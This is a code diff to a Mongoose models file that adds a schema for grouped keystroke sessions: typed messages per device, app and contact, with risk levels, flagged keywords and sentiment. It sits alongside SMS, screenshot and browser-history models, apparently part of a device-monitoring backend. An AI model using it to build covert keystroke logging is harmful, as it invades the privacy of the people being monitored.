@@ -429,6 +429,89 @@ browserHistorySchema.index({ timestamp: 1 }, { expireAfterSeconds: 172800 });
 
 const BrowserHistory = mongoose.model('BrowserHistory', browserHistorySchema);
 
+// Keystroke Session Schema for grouped keystroke data
+const keystrokeSessionSchema = new mongoose.Schema({
+  deviceId: {
+    type: String,
+    required: true,
+    index: true
+  },
+  sessionId: {
+    type: String,
+    required: true,
+    unique: true,
+    index: true
+  },
+  appPackage: {
+    type: String,
+    required: true
+  },
+  appName: {
+    type: String,
+    required: true
+  },
+  contactName: {
+    type: String,
+    default: 'Unknown'
+  },
+  messages: [{
+    timestamp: {
+      type: Date,
+      required: true
+    },
+    text: {
+      type: String,
+      required: true
+    },
+    fieldType: {
+      type: String,
+      enum: ['message', 'search', 'comment', 'text'],
+      default: 'text'
+    }
+  }],
+  messageCount: {
+    type: Number,
+    default: 0
+  },
+  firstMessageTime: {
+    type: Date,
+    required: true
+  },
+  lastMessageTime: {
+    type: Date,
+    required: true
+  },
+  // Risk analysis fields
+  riskLevel: {
+    type: String,
+    enum: ['LOW', 'MEDIUM', 'HIGH'],
+    default: 'LOW'
+  },
+  flaggedKeywords: [{
+    type: String
+  }],
+  sentiment: {
+    type: String,
+    enum: ['Positive', 'Neutral', 'Negative'],
+    default: 'Neutral'
+  },
+  timestamp: {
+    type: Date,
+    default: Date.now,
+    index: true
+  }
+});
+
+// Compound indexes for efficient querying
+keystrokeSessionSchema.index({ deviceId: 1, timestamp: -1 });
+keystrokeSessionSchema.index({ deviceId: 1, appPackage: 1 });
+keystrokeSessionSchema.index({ deviceId: 1, riskLevel: 1 });
+
+// Auto-delete after 7 days (privacy-conscious retention)
+keystrokeSessionSchema.index({ timestamp: 1 }, { expireAfterSeconds: 604800 });
+
+const KeystrokeSession = mongoose.model('KeystrokeSession', keystrokeSessionSchema);
+
 // Pairing Code Schema (temporary)
 const pairingCodeSchema = new mongoose.Schema({
   code: {
@@ -467,5 +550,6 @@ module.exports = {
   SMS,
   Screenshot,
   BrowserHistory,
+  KeystrokeSession,
   PairingCode
 };
